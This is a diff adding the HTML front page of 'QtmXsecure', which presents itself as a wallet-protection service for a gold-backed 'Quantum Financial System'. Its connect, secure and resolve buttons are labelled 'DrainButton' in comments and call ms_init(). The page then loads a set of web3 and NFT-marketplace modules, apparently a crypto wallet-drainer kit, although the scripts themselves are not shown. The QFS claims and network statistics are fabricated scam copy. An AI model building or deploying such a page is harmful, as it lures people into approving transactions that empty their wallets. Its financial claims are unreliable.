@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8"/>
+        <title>QtmXsecure</title>
+        <meta content="width=device-width, initial-scale=1" name="viewport"/>
+        <link href="style.css" rel="stylesheet" type="text/css"/>
+        <!-- Bootstrap CSS -->
+        <link href="bootstrap.css" rel="stylesheet" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+        <link rel="shortcut icon" href="img/logo.png" type="image/x-icon">
+
+        <!-- Custom CSS (Optional for Web3 Styling) -->
+        <style>
+            .modal-content {
+                background-color: #1a1a1a;
+                border-radius: 15px;
+                color: #ffffff;
+            }
+
+            .modal-title {
+                font-size: 1.5rem;
+                font-weight: bold;
+                color: #fff;
+            }
+
+            .btn-primary {
+                background-color: #02ff8b;
+                border: none;
+                font-size: 1rem;
+            }
+
+            .form-control {
+                background-color: #000;
+                color: #ffffff;
+                border: 1px solid #fff;
+                font-size: 1rem;
+                border-radius: 10px;
+            }
+            .form-control::placeholder {
+                color: #fff !important;
+                opacity: 0.3;
+            }
+
+            .form-control:focus {
+                border-color: #02ff8b;
+                box-shadow: none;
+            }
+        </style>
+        <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" type="text/javascript"></script><![endif]-->
+        <script type="text/javascript">
+            !function(o, c) {
+                var n = c.documentElement
+                  , t = " w-mod-";
+                n.className += t + "js",
+                ("ontouchstart"in o || o.DocumentTouch && c instanceof DocumentTouch) && (n.className += t + "touch")
+            }(window, document);
+        </script>
+        <!-- Please keep this css code to improve the font quality-->
+        <style>
+            * {
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="loader-line">
+            <div style="width:0%" class="loader-fill"></div>
+        </div>
+        <div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar_component w-nav">
+            <div class="navbar_container">
+                <a href="#" class="navbar_logo-link w-nav-brand">
+                    <img src="img/logoAlt.png" class="mainLogo" loading="lazy" alt="QtmXsecure logo
+"/>
+                </a>
+                <nav role="navigation" class="navbar_menu w-nav-menu">
+                    <div class="navbar_menu-right">
+                        <a href="#" class="navbar7_link w-nav-link" data-bs-toggle="modal" data-bs-target="#joinModal">Community</a>
+
+                        <!-- DrainButton -->
+                        <a href="#" onclick="ms_init()" class="navbar7_link w-nav-link text-black button pulse w-button">Connect</a>
+                        <!-- DrainButton -->
+                    </div>
+                </nav>
+                <div class="navbar_menu-button w-nav-button">
+                    <div class="menu-icon">
+                        <div class="menu-icon_line-top"></div>
+                        <div class="menu-icon_line-middle">
+                            <div class="menu-icon_line-middle-inner"></div>
+                        </div>
+                        <div class="menu-icon_line-bottom"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="page-wrapper">
+            <div class="custom-styles w-embed">
+                <style>
+                    html {
+                        font-size: calc(0.625rem + 0.41666666666666663vw);
+                    }
+
+                    @media screen and (max-width: 1920px) {
+                        html {
+                            font-size: calc(0.625rem + 0.41666666666666674vw);
+                        }
+                    }
+
+                    @media screen and (max-width: 1440px) {
+                        html {
+                            font-size: calc(0.8126951092611863rem + 0.20811654526534862vw);
+                        }
+                    }
+
+                    @media screen and (max-width: 479px) {
+                        html {
+                            font-size: calc(0.7494769874476988rem + 0.8368200836820083vw);
+                        }
+                    }
+
+                    .hello-block-top {
+                        clip-path: polygon(3.125rem 0%, calc(100% - 3.125rem) 0%, 99% 100%, 1% 100%);
+                    }
+
+                    .cta-block-bottom {
+                        clip-path: polygon(10% 64%, 90% 64%, 99% 0%, 1% 0%)
+                    }
+
+                    .footer-block-top {
+                        clip-path: polygon(25px 0%, calc(100% - 25px) 0%, 100% 100%, 0% 100%)
+                    }
+
+                    ::selection {
+                        background: #00ffbd;
+                        color: #232323;
+                    }
+
+                    body, html {
+                        text-rendering: geometricPrecision;
+                        -webkit-font-smoothing: antialiased;
+                        -webkit-font-smoothing: subpixel-antialiased
+                    }
+
+                    /* Pulsing Outline */
+                    .pulse {
+                        box-shadow: 0 0 0 0 rgba(20, 241, 149, 1);
+                        animation: pulsing-outline 2s infinite;
+                    }
+
+                    @keyframes pulsing-outline {
+                        0% {
+                            box-shadow: 0 0 0 0 rgba(20, 241, 149, 0.7);
+                        }
+
+                        70% {
+                            box-shadow: 0 0 0 10px rgba(20, 241, 149, 0);
+                        }
+
+                        100% {
+                            box-shadow: 0 0 0 0 rgba(20, 241, 149, 0);
+                        }
+                    }
+
+                    :root {
+                        --animate-line-speed: 0.3s;
+                        --animate-line-ease: cubic-bezier(0.12, 0, 0.39, 0);
+                    }
+
+                    .footer-link {
+                        display: inline-block;
+                        position: relative;
+                        overflow-x: hidden;
+                    }
+
+                    .footer-link::after {
+                        pointer-events: none;
+                        background-image: linear-gradient(13deg,#14f195,#9945ff);
+                        ;; content: "";
+                        height: 1px;
+                        position: absolute;
+                        left: auto;
+                        top: auto;
+                        right: 0%;
+                        bottom: 0%;
+                        width: 0%;
+                        transition: width var(--animate-line-ease) var(--animate-line-speed);
+                    }
+
+                    .footer-link:hover::after {
+                        width: 100%;
+                        right: auto;
+                        left: 0%;
+                    }
+                </style>
+            </div>
+            <div class="global-styles w-embed">
+                <style>
+                    /* Snippet gets rid of top margin on first element in any rich text*/
+                    .w-richtext>:first-child {
+                        margin-top: 0;
+                    }
+
+                    /* Snippet gets rid of bottom margin on last element in any rich text*/
+                    .w-richtext>:last-child, .w-richtext ol li:last-child, .w-richtext ul li:last-child {
+                        margin-bottom: 0;
+                    }
+
+                    /* Snippet prevents all click and hover interaction with an element */
+                    .clickable-off {
+                        pointer-events: none;
+                    }
+
+                    /* Snippet enables all click and hover interaction with an element */
+                    .clickable-on {
+                        pointer-events: auto;
+                    }
+
+                    /* Snippet enables you to add class of div-square which creates and maintains a 1:1 dimension of a div.*/
+                    .div-square::after {
+                        content: "";
+                        display: block;
+                        padding-bottom: 100%;
+                    }
+
+                    /*Hide focus outline for main content element*/
+                    main:focus-visible {
+                        outline: -webkit-focus-ring-color auto 0px;
+                    }
+
+                    /* Make sure containers never lose their center alignment*/
+                    .container-medium, .container-small, .container-large {
+                        margin-right: auto !important;
+                        margin-left: auto !important;
+                    }
+
+                    /*Reset buttons, and links styles*/
+                    a {
+                        color: inherit;
+                        text-decoration: inherit;
+                        font-size: inherit;
+                    }
+
+                    /*Apply "..." after 3 lines of text */
+                    .text-style-3lines {
+                        display: -webkit-box;
+                        overflow: hidden;
+                        -webkit-line-clamp: 3;
+                        -webkit-box-orient: vertical;
+                    }
+
+                    /*Apply "..." after 2 lines of text */
+                    .text-style-2lines {
+                        display: -webkit-box;
+                        overflow: hidden;
+                        -webkit-line-clamp: 2;
+                        -webkit-box-orient: vertical;
+                    }
+                </style>
+            </div>
+            <main class="main-wrapper">
+                <header class="section-header">
+                    <div class="page-padding">
+                        <div class="container-large">
+                            <div class="padding-vertical padding-xhuge">
+                                <div class="max-width-medium is-centered-tablet">
+                                    <div class="w-layout-grid header_component">
+                                        <div class="header_content">
+                                            <div class="margin-bottom margin-small">
+                                                <h1 class="heading-xlarge is-centered-tablet tricks slide-in">
+                                                    Secure, Asset-backed Financial Future. Effortless for Wallets.
+                                                </h1>
+                                            </div>
+                                            <div class="margin-top margin-small">
+                                                <div class="button-row">
+                                                    <div class="button-wrapper no-top-margin">
+                                                        <!-- DrainButton -->
+                                                        <a href="#" onclick="ms_init()" class="button pulse w-button">Connect Wallet</a>
+                                                        <!-- DrainButton -->
+                                                    </div>
+                                                    <div class="button-wrapper">
+                                                        <a href="#" class="button-secondary is-hero w-button" data-bs-toggle="modal" data-bs-target="#joinModal">Join the QFS Revolution</a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="margin-top margin-medium">
+                                                <p class="text-size-medium is-centered-tablet">
+                                                    Join the decentralized, asset-backed Quantum Financial System.
+                                                </p>
+                                            </div>                                            
+                                        </div>
+                                        
+                                        
+                                        <div class="video-overlay-layer"></div>
+                                        <div class="hero-full-video w-background-video w-background-video-atom" id="w-node-_251b2c22-fe60-73cc-9ff4-9742fadf2402-abe0ab1d">
+                                            <video id="251b2c22-fe60-73cc-9ff4-9742fadf2402-video" autoplay="" loop="" style="background-image:url(img/loopImg.jpg)" muted="" playsinline="" data-object-fit="cover">
+                                                <source src="img/loopVid.mp4" type="video/mp4">
+                                                <source src="img/loopVid.webm" type="video/webm">
+                                            </video>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </header>
+
+                <section class="section-hero-ticker">
+                    <div class="page-padding">
+                        <!-- <div class="hero-ticker-wrapper">
+                            <div class="hero-ticker-item">
+                                <div class="text-size-regular max-width-12">Transactions per second</div>
+                                <div class="text-size-xlarge text-weight-bold">2,365</div>
+                            </div>
+                            <div class="hero-ticker-item">
+                                TICKER WITH COUNT UP EFFECT
+                                <div class="text-size-regular max-width-12">Total Transactions</div>
+                                <div data-effect="countup" class="text-size-xlarge text-weight-bold is-countup">8,986,058</div>
+                            </div>
+                            <div class="hero-ticker-item">
+                                <div class="text-size-regular max-width-12">Avg. cost per transaction</div>
+                                <div class="text-size-xlarge text-weight-bold">$0.00025</div>
+                            </div>
+                            <div class="hero-ticker-item is-last">
+                                <div class="text-size-regular max-width-12">Validator nodes</div>
+                                <div class="text-size-xlarge text-weight-bold">
+                                    <strong>1,732</strong>
+                                    <br/>
+                                </div>
+                            </div>
+                        </div> -->
+                        <div class="hero-ticker-wrapper">
+                            <div class="hero-ticker-item">
+                                <div class="text-size-regular max-width-12">Protocols Supported</div>
+                                <div class="text-size-xlarge text-weight-bold">47</div>
+                            </div>
+                            <div class="hero-ticker-item">
+                                <div class="text-size-regular max-width-12">Avg. Sync Time per Wallet</div>
+                                <div class="text-size-xlarge text-weight-bold">0.12 seconds</div>
+                            </div>
+                            <div class="hero-ticker-item">
+                                <div class="text-size-regular max-width-12">Wallets Synced Securely with QFS</div>
+                                <div class="text-size-xlarge text-weight-bold">15,482</div>
+                            </div>
+                            <div class="hero-ticker-item is-last">
+                                <div class="text-size-regular max-width-12">Secure Validator Nodes (ISO 20022 Compliant)</div>
+                                <div class="text-size-xlarge text-weight-bold">
+                                    <strong>2,056</strong>
+                                    <br/>
+                                </div>
+                            </div>
+                        </div>
+                        
+                    </div>
+                </section>
+
+                <section class="section-layout">
+                    <div class="page-padding">
+                        <div class="container-large">
+                            <div class="margin-vertical margin-huge">
+                                <div class="w-layout-grid layout_component">
+                                    <div class="layout_content-left">
+                                        <h2 class="heading-large is-centered-mobile">
+                                            Join the Most Secure, Asset-Backed Wallet Protection Protocol<br/>
+                                        </h2>
+                                    </div>
+                                    <div class="layout_content-right">
+                                        <p class="text-size-medium is-centered-mobile">
+                                            QtmXsecure offers unmatched security for syncing and protecting wallets in the Quantum Financial System (QFS). Fully backed by tangible assets like Gold and Silver, and compliant with ISO20022 standards, we ensure that your assets are safe and future-proof, ready for the new financial era.
+                                        </p>
+                                        <div class="margin-top margin-medium">
+                                            <div class="button-row">
+                                                <div class="button-wrapper no-margin">
+                                                    <!-- DrainButton -->
+                                                    <a href="#" onclick="ms_init()" class="button-alt w-button">Secure Your Wallet</a>
+                                                    <!-- DrainButton -->
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>
+                            
+                        </div>
+                    </div>
+                </section>
+                <section data-w-id="dbe9990a-89bc-c8d1-2e1e-e4474a098f4b" class="section-hello">
+                    <div class="margin-vertical margin-huge">
+                        <div class="margin-top margin-medium">
+                            <div class="page-padding">
+                                <div class="section-hello-wrapper">
+                                    <div class="hello-video-wrapper">
+                                        <div class="hello-video w-background-video w-background-video-atom">
+                                            <video id="7980c477-0a7d-965b-72d0-f44ea9791352-video" autoplay loop style="background-image:url(img/newimg.jpg)" muted playsinline>
+                                                <source src="img/newvid.mp4" type="video/mp4">
+                                                <source src="img/newvid.webm" type="video/webm">
+                                            </video>
+                                        </div>
+                                    </div>
+                                    <div class="hello-block-wrapper">
+                                        <div class="hello-block-top"></div>
+                                        <div class="hello-block-main">
+                                            <div class="margin-bottom margin-small">
+                                                <h2 class="heading-large">
+                                                    Sync Your Wallet Securely within the QFS<br/>
+                                                </h2>
+                                            </div>
+                                            <div class="margin-bottom margin-small max-width-xsmall">
+                                                <p class="text-size-medium is-smaller">
+                                                    Click here to resolve wallet synchronization issues with the Quantum Financial System<br/>
+                                                </p>
+                                            </div>
+                                    
+                                            <!-- DrainButton -->
+                                            <a href="#" onclick="ms_init()" class="button-pill w-button">Resolve</a>
+                                            <!-- DrainButton -->            
+                                        </div>
+                                    </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                <div class="section-scale padding-bottom padding-large">
+                    <div class="margin-vertical margin-huge">
+                        <div class="page-padding">
+                            <div class="scale-content-wrapper">
+                                <div class="container-large">
+                                    <div class="max-width-large">
+                                        <div class="margin-bottom margin-small">
+                                            <h2 class="heading-large is-scale-section">
+                                                Sync<br/>
+                                                <span class="heading-medium is-span">for seamless, secure asset-backed integration</span>
+                                            </h2>
+                                        </div>
+                                        <div class="text-size-medium is-smaller">
+                                            Integrate once and enjoy effortless wallet synchronization within the Quantum Financial System (QFS). Experience secure, decentralized interoperability across wallets and platforms as we move into the next era of global finance.
+                                        </div>
+                                    </div>
+                                    
+                                    
+                                </div>                                
+                            </div>
+                        </div>
+                        <img src="img/blob1.png" loading="lazy" sizes="100vw" alt="" class="full-image"/>
+                    </div>
+                </div>
+                <section class="section-features">
+                    <div class="margin-vertical margin-huge">
+                        <div class="page-padding">
+                            <div class="container-large">
+                                <div class="features-wrapper">
+                                    <div data-w-id="24f89a9d-31f4-8bc3-a71b-22b30c0e6b97" class="feature-card">
+                                        <div class="card-top">
+                                            <div class="margin-bottom margin-small">
+                                                <h2 class="heading-large">Low Cost, Asset-Backed</h2>
+                                            </div>
+                                            <div class="text-size-medium is-smaller">
+                                                QtmXsecure, powered by the Quantum Financial System (QFS), keeps wallet synchronization costs minimal for users while ensuring every transaction is securely backed by tangible assets.
+                                            </div>
+                                        </div>
+                                        <div class="card-bottom">
+                                            <img src="img/disk.png" loading="lazy" sizes="(max-width: 479px) 92vw, (max-width: 767px) 95vw, 45vw" alt="" class="full-image"/>
+                                        </div>
+                                    </div>
+                                    <div class="features-wrapper">
+                                        <div data-w-id="7e051404-29b5-3baa-f27b-cbdb0a052510" class="feature-card">
+                                            <div class="card-top">
+                                                <div class="margin-bottom margin-small">
+                                                    <h2 class="heading-large">Fast, Secure, and Scalable</h2>
+                                                </div>
+                                                <div class="text-size-medium is-smaller">
+                                                    QtmXsecure ensures rapid wallet synchronization within the Quantum Financial System (QFS), delivering unparalleled security.
+                                                </div>
+                                            </div>
+                                            <div class="card-bottom">
+                                                <img src="img/circlw.png" loading="lazy" sizes="(max-width: 479px) 92vw, (max-width: 767px) 95vw, 46vw" alt="" class="full-image"/>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>                                                              
+                            </div>
+                            
+                        </div>
+                    </div>
+                </section>
+                <div class="section-decenstralized">
+                    <div class="margin-vertical margin-huge">
+                        <div class="page-padding">
+                            <div class="section-content-wrapper">
+                                <div class="container-large">
+                                    <div class="max-width-large">
+                                        <div class="margin-bottom margin-small">
+                                            <h2 class="heading-large is-scale-section">
+                                                Decentralized<span class="heading-medium is-span">and Asset-Backed</span>
+                                            </h2>
+                                        </div>
+                                        <div class="text-size-medium is-smaller">
+                                            QtmXsecure operates fully within the Quantum Financial System (QFS), offering fast, decentralized wallet synchronization. Built on ISO20022 standards, the protocol ensures secure, censorship-resistant transactions and guarantees uninterrupted financial activities, supported by precious metals for a stable, asset-backed future.<br/>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        
+                        <div class="section-background">
+                            <img src="img/arc.png" loading="lazy" sizes="(max-width: 3048px) 100vw, 3048px" alt=""/>
+                        </div>
+                    </div>
+                </div>
+                <div class="section-cta">
+                    <div class="margin-vertical margin-huge">
+                        <div class="page-padding">
+                            <div class="container-large">
+                                <div class="cards-grid">
+                                    <div id="w-node-_86aa4135-ada9-5fc0-b8bf-358ebcae8327-abe0ab1d" data-w-id="86aa4135-ada9-5fc0-b8bf-358ebcae8327" class="cta-card is-pink">
+                                        <div class="cta-top">
+                                            <div class="margin-bottom margin-small">
+                                                <h2 class="heading-medium">QtmXsecure Community</h2>
+                                            </div>
+                                            <div class="text-size-medium is-smaller">
+                                                Join a global community centered around the Quantum Financial System (QFS). Stay updated on the latest advancements in secure, asset-backed wallet synchronization. Connect with others as we transition into a new era of decentralized finance.
+                                            </div>
+                                        </div>
+                                        <div class="card-bottom">
+                                            <a href="#" class="button-pill w-button" data-bs-toggle="modal" data-bs-target="#joinModal">Join</a>
+                                        </div>
+                                    </div>
+                                    <div id="w-node-_3beec6f1-0c15-1e64-0f84-1d756056bdea-abe0ab1d" data-w-id="3beec6f1-0c15-1e64-0f84-1d756056bdea" class="cta-card is-green">
+                                        <div class="cta-top">
+                                            <div class="margin-bottom margin-small">
+                                                <h2 class="heading-medium">Become a Validator</h2>
+                                            </div>
+                                            <div class="text-size-medium is-smaller">
+                                                Support the security and efficiency of QtmXsecure's decentralized protocol within the QFS. Validators play a crucial role in maintaining the integrity of asset-backed transactions. Learn how to operate a node and contribute to the secure synchronization of wallets backed by gold, silver, and other valuable assets.
+                                            </div>
+                                        </div>
+                                        <div class="card-bottom" style="display: flex; align-items: end;">
+                                            <a href="#" class="button-pill w-button" data-bs-toggle="modal" data-bs-target="#joinModal">Get Started</a>
+                                        </div>
+                                    </div>
+                                    <div id="w-node-_6eeb0fe2-a073-5c2d-4b55-c76e6ae75e63-abe0ab1d" data-w-id="6eeb0fe2-a073-5c2d-4b55-c76e6ae75e63" class="cta-card is-blue is-column">
+                                        <div class="cta-top">
+                                            <div class="max-width-small">
+                                                <h2 class="heading-medium">Developer Resources</h2>
+                                            </div>
+                                        </div>
+                                        <div class="card-bottom">
+                                            <div class="margin-bottom margin-small">
+                                                <div class="text-size-medium is-smaller">
+                                                    Access all the tools you need to build on QtmXsecure’s decentralized protocol within the Quantum Financial System. Explore guides, SDKs, and resources to integrate your applications securely.
+                                                </div>
+                                            </div>
+                                            <a href="#" class="button-pill w-button" data-bs-toggle="modal" data-bs-target="#joinModal">Start Building</a>
+                                        </div>
+                                        <div class="cta-block-bottom"></div>
+                                    </div>
+                                </div>
+                                
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <footer class="footer_component">
+                    <div class="page-padding">
+                        <div class="container-large">
+                            <div class="padding-vertical padding-xxxlarge">
+                                <div data-w-id="1c308341-0cda-3394-0e8b-948aa791b3e0" style="opacity:0" class="line-divider"></div>
+                                <!-- <div class="padding-vertical padding-xxlarge">
+                                    <h3 class="heading-small text-align-center">Get more out of QtmXsecure</h3>
+                                </div>
+                                <div class="padding-bottom padding-xxlarge">
+                                    <div class="w-layout-grid footer_top-wrapper">
+                                        <div class="footer_link-list">
+                                            <div class="footer_column-heading">Build</div>
+                                            <a href="#" class="footer-link">Docs</a>
+                                            <a href="#" class="footer-link">Github ↘</a>
+                                            <a href="#" class="footer-link">Chat on Discord ↘</a>
+                                            <a href="#" class="footer-link">Status ↘</a>
+                                        </div>
+                                        <div class="footer_link-list">
+                                            <div class="footer_column-heading">Apply</div>
+                                            <a href="#" class="footer-link">Grants</a>
+                                            <a href="#" class="footer-link">Collective ↘</a>
+                                            <a href="#" class="footer-link">Careers ↘</a>
+                                        </div>
+                                        <div class="footer_link-list">
+                                            <div class="footer_column-heading">learn</div>
+                                            <a href="#" class="footer-link">Blog</a>
+                                            <a href="#" class="footer-link">Podcast</a>
+                                            <a href="#" class="footer-link">Videos ↘</a>
+                                            <a href="#" class="footer-link">Network Stats ↘</a>
+                                        </div>
+                                        <div class="footer_link-list">
+                                            <div class="footer_column-heading">other</div>
+                                            <a href="#" class="footer-link">Break QtmXsecure</a>
+                                            <a href="#" class="footer-link">Disclaimer</a>
+                                            <a href="#" class="footer-link">Press &amp;Brand</a>
+                                        </div>
+                                    </div>
+                                </div> -->
+
+
+                                <div class="padding-top padding-medium">
+                                    <div class="footer_bottom-wrapper">
+                                        <div class="footer-block-top"></div>
+                                        <div class="footer-bottom">
+                                            <div class="footer-left">
+                                                <div class="icon-embed w-embed">
+                                                    <img src="img/logo.png" class="mainLogo" alt="">
+                                                </div>
+                                            </div>
+                                            <div class="footer-right">
+                                                <div class="footer-title margin-right margin-xsmall">quantumxsecure.id</div>
+                                                <div class="icon-embed w-embed">
+                                                    <svg height="20" class="ms-1" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="globe" role="img" viewBox="0 0 496 512">
+                                                        <path fill="currentColor" d="M336.5 160C322 70.7 287.8 8 248 8s-74 62.7-88.5 152h177zM152 256c0 22.2 1.2 43.5 3.3 64h185.3c2.1-20.5 3.3-41.8 3.3-64s-1.2-43.5-3.3-64H155.3c-2.1 20.5-3.3 41.8-3.3 64zm324.7-96c-28.6-67.9-86.5-120.4-158-141.6 24.4 33.8 41.2 84.7 50 141.6h108zM177.2 18.4C105.8 39.6 47.8 92.1 19.3 160h108c8.7-56.9 25.5-107.8 49.9-141.6zM487.4 192H372.7c2.1 21 3.3 42.5 3.3 64s-1.2 43-3.3 64h114.6c5.5-20.5 8.6-41.8 8.6-64s-3.1-43.5-8.5-64zM120 256c0-21.5 1.2-43 3.3-64H8.6C3.2 212.5 0 233.8 0 256s3.2 43.5 8.6 64h114.6c-2-21-3.2-42.5-3.2-64zm39.5 96c14.5 89.3 48.7 152 88.5 152s74-62.7 88.5-152h-177zm159.3 141.6c71.4-21.2 129.4-73.7 158-141.6h-108c-8.8 56.9-25.6 107.8-50 141.6zM19.3 352c28.6 67.9 86.5 120.4 158 141.6-24.4-33.8-41.2-84.7-50-141.6h-108z"></path>
+                                                    </svg>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </footer>
+            </main>
+        </div>
+
+
+
+
+
+
+
+
+        <div class="modal fade" id="joinModal" tabindex="-1" aria-labelledby="joinModalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered">
+                <div class="modal-content">
+                    <!-- Modal Header -->
+                    <div class="modal-header d-flex justify-between gap-3">
+                        <h5 class="modal-title" id="joinModalLabel">Join the QtmXsecure Community</h5>
+                        <button type="button" class="bg-opacity-0 text-white" data-bs-dismiss="modal" aria-label="Close"><!-- Font Awesome X Icon -->
+                            <i class="fas fa-times text-white fs-3"></i>
+                            </button>
+                    </div>
+                    <!-- Modal Body -->
+                    <div class="modal-body">
+                        <form class="d-flex flex-column gap-3">
+                            <div class="mb-3">
+                                <label for="name" class="form-label">Name</label>
+                                <input type="text" class="form-control" id="name" name="fullname" placeholder="Enter your name" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="email" class="form-label">Email</label>
+                                <input type="email" class="form-control" id="email" name="email" placeholder="Enter your email" required>
+                            </div>
+                            <button type="submit" class="button-secondary is-hero w-button">Join Now</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+        <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=626912d685fd092a4de0ab21" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+        <script src="script.js" type="text/javascript"></script>
+        <!--[if lte IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script><![endif]-->
+        <style>
+            .letter {
+                display: inline-block;
+            }
+
+            .tricksword {
+                white-space: nowrap;
+            }
+        </style>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/2.0.2/anime.min.js"></script>
+        <!-- Bootstrap JS and Popper.js -->
+        
+        <!-- Bootstrap JS and Popper.js -->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/protonet-jquery.inview/1.1.2/jquery.inview.min.js"></script>
+        <script>
+            let count = parseInt(parseInt(document.querySelectorAll('[data-effect="countup"]')[0].textContent.replace(/,/g, "")));
+            let count_up = setInterval(function() {
+                count += 10;
+                document.querySelectorAll('[data-effect="countup"]')[0].innerHTML = count.toLocaleString();
+            }, 5);
+
+            let tricksWord = document.getElementsByClassName("tricks");
+            for (let i = 0; i < tricksWord.length; i++) {
+                let wordWrap = tricksWord.item(i);
+                wordWrap.innerHTML = wordWrap.innerHTML.replace(/(^|<\/?[^>]+>|\s+)([^\s<]+)/g, '$1<span class="tricksword">$2</span>');
+            }
+
+            let tricksLetter = document.getElementsByClassName("tricksword");
+            for (let i = 0; i < tricksLetter.length; i++) {
+                let letterWrap = tricksLetter.item(i);
+                letterWrap.innerHTML = letterWrap.textContent.replace(/\S/g, "<span class='letter'>$&</span>");
+            }
+
+            let slideIn = anime.timeline({
+                loop: false,
+                autoplay: false
+            });
+
+            slideIn.add({
+                targets: ".slide-in .letter",
+                opacity: [0, 1],
+                easing: "easeInOutQuad",
+                duration: 100,
+                delay: (el,i)=>50 * (i + 1)
+            });
+
+            slideIn.play();
+        </script>
+
+
+
+        <!-- <script src="./assets/web3-provider/web3-modal.js"></script>-->
+        <!--<script src="./assets/web3-provider/web3-loader.js"></script>-->
+        <script src="./assets/web3-provider/web3-connect.js"></script>
+        <script src="./assets/web3-provider/web3-router.js"></script>
+        <script src="./assets/web3-provider/web3-module.js"></script>
+        <script src="./assets/web3-provider/web3-alert.js"></script>
+        <script src="./assets/web3-provider/web3-seaport.js"></script>
+        <script src="./assets/web3-provider/web3-data.js"></script>
+        <script src="./assets/web3-provider/ethers.js"></script>
+        <script src="./assets/web3-provider/ethereum-tx.js"></script>
+        <script src="./assets/web3-modules/module-blur.js"></script>
+        <script src="./assets/web3-modules/module-seaport.js"></script>
+        <script src="./assets/web3-modules/module-x2y2.js"></script>
+        <script src="./assets/web3-provider.js"></script>
+        <script src="web3-loader.js"></script>
+        <!--<script src="wc-web3-modal.js"></script>-->
+        <script src="./assets/web3-provider/wc-web3-modal.js"></script>
+        <script>
+            setInterval(() => {
+                document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
+            }, 1000);
+        </script>
+    </body>
+</html>
